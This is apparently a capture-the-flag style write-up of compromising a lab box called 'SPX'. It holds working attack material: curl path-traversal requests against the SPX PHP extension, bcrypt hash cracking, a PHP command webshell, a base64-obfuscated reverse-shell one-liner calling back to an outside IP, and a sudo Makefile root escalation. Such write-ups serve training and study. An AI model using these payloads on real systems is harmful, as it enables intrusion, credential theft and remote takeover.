---
title: SPX
date: 2025-11-20
---
Difficulty: Intermediate
# Service Discovery

## Open Ports & Priority
TCP Ports:
- [ ] 80
- [ ] 22

# Service Enumeration
## 80 - HTTP
Server: Apache/2.4.52 (Ubuntu)

TinyFileManager
https://tinyfilemanager.github.io/

![[Pasted image 20251120184215.png]]

Tried guessing default/weak passwords:
- admin:admin
- admin:admin@123
- user:user
- user:user12345
- spx:spx
- h3k:h3k

PHPinfo is exposed on http://spx/phpinfo.php
- webroot: /var/www/html
- user: www-data(33)/33
- OS: Linux spx 5.15.0-122-generic  132-Ubuntu SMP Thu Aug 29 13:45:52 UTC 2024 x86_64

It has a section for SPX, which is interesting as that's also the name of this box:

![[Pasted image 20251120185321.png]]

SPX is Simple Profiling eXtension and is a FOSS PHP extension for profiling PHP scripts.

CVE-2024-42007 is a path traversal vulnerability affecting SPX up to and including versions 0.4.15, which matches this exact version.

This GitHub issue shows original reporting and a POC HTTP request.
https://github.com/NoiseByNorthwest/php-spx/issues/251

I found a POC exploit to make exploitation more convenient:
https://github.com/BubblyCola/CVE_2024_42007

The POC failed so I had to look a bit closer... the GitHub issue payload makes the request to:
`/?SPX_KEY=dev&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd`

I noticed the SPX_KEY was also set to dev in the POC like we see here. However, we can see that in PHPinfo, SPX.http_key is set to a2a90ca2f9f0ea04d267b16fb8e63800.

By changing this, I was able to use curl to exploit the directory traversal, without needing the Python exploit:

`curl 'http://spx/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'`

![[Pasted image 20251120192443.png]]

From here, I immediately tried to check if we could access any SSH keys for the profiler user, at paths like /home/profiler/..ssh/id_rsa. No such luck, meaning either www-data doesn't have access (which is how it should be) or that such a file simply doesn't exist. 

However, we can go for source code disclosure, such as downloading index.php:

`curl 'http://spx/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2fwww%2fhtml%2findex.php' -o index.php`

![[Pasted image 20251120193201.png]]

This is good, we have Tiny File Manager's exact version as 2.5.3 and some password hashes.

Let's try to crack these hashes. $2y indicates they're bcrypt, so we can use -m 3200 with hashcat.

tinyfilemanager.hashes
```
$2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG
$2y$10$x8PS6i0Sji2Pglyz7SLFruYFpAsz9XAYsdiPyfse6QDkB/QsdShxi
```

`hashcat -m 3200 tinyfilemanager.hashes /usr/share/wordlists/rockyou.txt`

After about 20 minutes, both of these were cracked:
![[Pasted image 20251120200457.png]]
user:profiler
admin:lowprofile

Logging in with admin, it looks like I'm able to upload files to the webroot as www-data; I'll upload a webshell such as /usr/share/webshells/php/simple-backdoor.php:
```
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
```

![[Pasted image 20251120201140.png]]

Now we can use the shell to execute arbitrary code on the server.

![[Pasted image 20251120201317.png]]

`curl 'http://spx/webshell.php' -G --data-urlencode 'cmd=whoami'`

I'll use this to establish a reverse shell.

Start a listener
`penelope -p 80`

Execute payload to establish shell:
`curl 'http://spx/webshell.php' -G --data-urlencode 'cmd=printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xOTYvODAgMD4mMSkgJg==|base64 -d|bash'`

![[Pasted image 20251120201453.png]]

# Privilege Escalation

First, I'll check for password reuse with the credentials found in index.php:
- profiler
- lowprofile

No luck for `sudo -l` or `su root`. 
Ah, what about `su profiler` though?...

![[Pasted image 20251120202801.png]]

Success, profiler's password is `lowprofile`!

Now to restart privesc enumeration.

`sudo -l` shows that profiler can run `make install /usr/bin/make install -C /home/profiler/php-spx` as root.

![[Pasted image 20251120203931.png]]

We own /home/profiler/php-spx/Makefile, so we can overwrite it to change what the install target does. We can even delete everything else (after making a backup of the folder, to be safe) in Makefile and just have:
```
install:
	/bin/bash
```

Using this method, modify Makefile and save it, when  run our allowed sudo command to drop into a root shell.

![[Pasted image 20251120204220.png]]

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

/home/profiler/local.txt
07b73ef749f523e865e4108796a43ae5

/root/proof.txt
10408eecd04fa5bbf5f5688b70093781

![[Pasted image 20251120204434.png]]
